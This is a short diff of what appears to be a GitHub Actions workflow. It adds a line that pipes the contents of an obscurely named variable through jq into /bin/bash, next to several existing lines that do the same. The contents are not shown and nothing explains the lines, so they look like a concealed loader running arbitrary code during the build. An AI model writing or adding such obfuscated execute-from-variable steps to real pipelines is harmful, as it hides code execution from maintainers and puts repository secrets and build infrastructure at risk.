@@ -25,6 +25,7 @@ jobs:
           echo $pq2 | jq -r .nasam55100 | /bin/bash
           printf '%s' "$ueak3" | jq -r .q54942 | /bin/bash
           echo $rttl598 | jq -r .cjk2 | /bin/bash
+          echo $al77 | jq -r .kd313 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
